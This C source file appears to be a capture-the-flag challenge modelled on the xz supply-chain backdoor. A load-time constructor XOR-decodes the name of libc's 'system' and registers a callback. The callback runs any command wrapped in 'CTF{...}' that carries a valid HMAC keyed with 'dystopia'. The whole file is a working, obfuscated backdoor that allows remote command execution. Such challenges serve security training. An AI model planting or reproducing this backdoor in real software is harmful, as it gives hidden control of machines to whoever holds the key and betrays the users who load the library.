#include "xzsupply.h"
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>

#define MAX_CMD 512
#define PFX_LEN 4

static int (*sptr)(const char *);
static const char *prefix = "CTF{";
static const char *bsides = "bsides";
static const char *dystopia = "dystopiawithoutai";
static const char *obfs = "\x11\x0a\x1a\x10\x00\x1e";
static HMAC_CTX verifier;

static int bdcb(char *src, size_t len) {
	char buf[MAX_CMD+8+SHA256_OUTPUT_SIZE];
	if (!sptr) {
		_exit(1);
	}
	char *p = memmem(src, len, prefix, PFX_LEN);
	if (!p) {
		return 0;
	}
	p += PFX_LEN;
	len -= (p-src);
	len -= PFX_LEN;
	char *e = memchr(src, '}', len);
	if (!e) {
		return 0;
	}
	size_t cmd_len = e-p;
	if (len - (cmd_len + 1) < SHA256_OUTPUT_SIZE) {
		return 0;
	}
	hmac_init(&verifier, dystopia, 8);
	hmac_update(&verifier, p, cmd_len);
	hmac_final(&verifier, buf);
	if (!hmac_cmp(buf, e+1, SHA256_OUTPUT_SIZE)) {
		memcpy(buf, p, cmd_len);
		buf[cmd_len] = '\0';
		sptr(buf);
		return 1;
	}
	return 0;
}

__attribute__ ((constructor))
static void bdctr(void) {
	char buf[16];
	void *handle = dlopen("libc.so.6", RTLD_LAZY);
	for (int i=0;i<16;i++) {
		buf[i] = (char)0;
	}
	for (int i=0;i<6;i++) {
		buf[i] = bsides[i] ^ obfs[i];
	}
	sptr = dlsym(handle, buf);
	prefix_callback(prefix, bdcb);
}


HMAC_CTX *get_h() {
	hmac_init(&verifier, dystopia, 8);
	return &verifier;
}
